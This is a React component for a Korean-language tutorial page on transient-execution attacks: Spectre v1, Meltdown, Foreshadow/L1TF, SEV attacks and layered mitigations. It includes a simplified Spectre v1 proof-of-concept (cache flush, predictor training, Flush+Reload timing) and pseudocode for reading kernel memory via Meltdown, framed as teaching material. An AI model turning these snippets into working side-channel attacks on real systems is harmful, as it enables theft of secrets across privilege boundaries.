export default function Spectre() {
  return (
    <section id="spectre" className="mb-16 scroll-mt-20">
      <h2 className="text-2xl font-bold mb-6">Spectre &amp; Meltdown</h2>
      <div className="prose prose-neutral dark:prose-invert max-w-none">

        <h3 className="text-xl font-semibold mt-6 mb-3">Transient Execution Attacks 개요</h3>
        <p>
          <strong>투기적 실행</strong>(Speculative Execution)이 보안 취약점으로 돌변<br />
          <strong>원리</strong>: CPU가 분기 결과 예측 → 잘못 예측해도 투기적 실행 결과가 마이크로아키텍처 상태에 잔재<br />
          <strong>핵심</strong>: 비밀 데이터에 의존하는 메모리 접근이 <strong>캐시에 흔적</strong><br />
          <strong>탐지</strong>: Flush+Reload로 어떤 캐시 라인이 로드됐는지 측정 → 비밀 복원
        </p>

        <h3 className="text-xl font-semibold mt-8 mb-3">Spectre v1 (Bounds Check Bypass)</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// 취약 코드 패턴
if (x < array1_size) {
    y = array2[array1[x] * 4096];
    // ↑ 투기적 실행 시 array2 접근이 캐시에 흔적 남김
}

// 공격 흐름
// 1) 정상 훈련: 여러 번 x < array1_size 성립시켜 predictor를 "true" 학습
// 2) 공격: x = 목표 비밀 주소 (array1_size 초과)
// 3) CPU가 predictor 믿고 투기 실행
// 4) array1[x] = 비밀 바이트 b 로드 (권한 체크 전)
// 5) array2[b * 4096] 투기 접근 → 캐시 라인 b 로드
// 6) 권한 체크 실패 → rollback (하지만 캐시 흔적 남음)
// 7) Flush+Reload로 어떤 line이 loaded됐는지 측정 → b 값 추출

// Exploit PoC (단순화)
volatile int v = 0;
for (size_t k = 0; k < 256; k++) {
    _mm_clflush(&array2[k * 4096]);  // cache flush
}

// Train
for (size_t j = 0; j < 10; j++) {
    x = j % array1_size;  // in-bounds
    if (x < array1_size) v = array2[array1[x] * 4096];
}

// Attack
x = SECRET_OFFSET;  // out-of-bounds
if (x < array1_size) v = array2[array1[x] * 4096];

// Measure
for (size_t k = 0; k < 256; k++) {
    time = rdtscp_measure(&array2[k * 4096]);
    if (time < THRESHOLD) secret_byte = k;
}`}</pre>

        <h3 className="text-xl font-semibold mt-8 mb-3">Meltdown (Rogue Data Cache Load)</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// Meltdown exploit 핵심
// 커널 메모리를 사용자 공간에서 투기적으로 읽기

// Intel CPU 버그:
// - Page fault는 명령 retirement 시점에 체크
// - 투기 실행 중에는 권한 무시하고 로드
// - 로드된 값이 dependent instruction에 사용됨

// 공격 흐름
try:
    char b = *(char*)kernel_address;  // → page fault (but 투기적 접근)
    // 투기 실행으로 아래가 실행됨
    array[b * 4096];                   // cache 기록
except PageFault:
    pass  // 정상 흐름

// Flush+Reload로 array의 어떤 인덱스가 캐시됐는지 측정
// → kernel byte 값 복원

// 영향
// - 사용자가 전체 커널 메모리 dump 가능
// - ~500 KB/s 속도
// - KPTI(Kernel Page Table Isolation)으로 완화
//   → 사용자 모드에서 kernel VA 미매핑`}</pre>

        <h3 className="text-xl font-semibold mt-8 mb-3">Foreshadow — SGX L1TF</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// L1TF(L1 Terminal Fault) - SGX-specific variant

// SGX Enclave 메모리는 EPC(Encrypted Page Cache)에 저장
// 외부 접근 시 abort page 반환 → 공격자는 직접 못 봄

// 하지만!
// - Enclave 실행 중에는 L1 cache에 평문 존재
// - L1TF: page table 조작으로 L1 cache 탈취

// 공격 흐름
// 1) 공격자가 host PTE에서 P-bit(Present) 제거
// 2) PTE를 non-present로 만들고 PA field에 EPC 주소 설정
// 3) 투기 실행이 L1 cache에서 EPC 데이터 로드
// 4) Page fault 발생하지만 투기 실행은 계속
// 5) 로드된 enclave 데이터를 cache side channel로 추출

// Intel 완화
// - L1D_FLUSH_CMD MSR 추가
// - Enclave exit 시 L1 cache 플러시
// - SMT 비활성화 권장 (데이터센터)
// - Microcode 패치 + OS 대응

// Attestation 영향
// - Foreshadow 영향 받은 CPU는 Intel IAS가 거부
// - TCB 업데이트 필요
// - 재확인 필수`}</pre>

        <h3 className="text-xl font-semibold mt-8 mb-3">SEV-ES/SNP의 Transient 공격</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// SEV에 대한 주요 transient 공격

// [SEVerity] (Morbitzer et al. 2021)
// - Hypervisor가 VMSA 재사용 공격
// - 공격자 VM 레지스터 값 주입
// - SEV-SNP은 VMSA 서명으로 방어

// [CacheWarp] (2023)
// - INVD 명령 투기 실행
// - 캐시 무효화 → 메모리 변조 잔존
// - Microcode 패치

// [Sev-Step] (2023)
// - VMEXIT 타이밍 + APIC timer
// - Single-step guest instruction execution
// - 앱 레벨 constant-time 대응 필수

// SEV-SNP RMP가 방어 못 하는 것
// - RMP는 page ownership만 검증
// - 투기 실행의 cache pollution은 별개 문제
// - Microcode + constant-time 앱이 해결책`}</pre>

        <h3 className="text-xl font-semibold mt-8 mb-3">완화 계층</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// Hardware mitigation
// - IBRS: Indirect Branch Restricted Speculation
// - IBPB: Indirect Branch Predictor Barrier
// - STIBP: Single Thread Indirect Branch Predictors
// - SSBD: Speculative Store Bypass Disable
// - eIBRS: enhanced IBRS (Ice Lake+)

// Compiler mitigation
// - Retpoline: indirect call → return trampoline
// - LFENCE barriers: 투기 실행 차단
// - Spectre v1: array index masking

// OS mitigation
// - KPTI: Kernel Page Table Isolation
// - L1D flush on VMENTER
// - MDS clear on context switch

// App-level constant-time
// - Branch-free comparison
// - Table lookup 없는 AES (AES-NI 사용)
// - Oblivious data structures

// Deployment recommendations
// - SMT 비활성화 (confidential workload)
// - Microcode 최신 유지
// - TCB attestation 강제 (TCB_UP_TO_DATE)
// - 앱: constant-time crypto 라이브러리`}</pre>

        <div className="bg-amber-50 dark:bg-amber-950/30 border-l-4 border-amber-400 p-4 my-6 rounded-r-lg">
          <p className="font-semibold mb-2">인사이트: Transient 공격의 근본 해결 불가능성</p>
          <p>
            <strong>구조적 문제</strong>:<br />
            - 투기 실행은 CPU 성능의 근간<br />
            - 완전 제거 시 성능 50%+ 하락<br />
            - 완전한 isolation은 현대 CPU 아키텍처에서 불가능
          </p>
          <p className="mt-2">
            <strong>현재 접근</strong>:<br />
            - Best-effort mitigation (new attack → new fix)<br />
            - 공격별 TCB 업데이트<br />
            - Attestation이 TCB 버전 강제
          </p>
          <p className="mt-2">
            <strong>장기 방향</strong>:<br />
            - Secure speculation 아키텍처 연구 (MIT, Google)<br />
            - 하드웨어 분리된 투기 실행 unit<br />
            - 현재로선 formal verification 어려움
          </p>
        </div>

      </div>
    </section>
  );
}
